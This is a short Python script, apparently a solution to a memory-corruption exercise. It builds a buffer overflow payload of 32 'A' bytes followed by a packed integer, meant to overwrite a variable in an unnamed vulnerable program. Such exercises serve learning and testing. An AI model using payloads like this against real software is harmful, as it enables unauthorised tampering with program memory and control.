import struct

junk = b'A' * 32
value = struct.pack('I', 1)

payload = junk + value

print(payload.decode('latin-1'), end='')
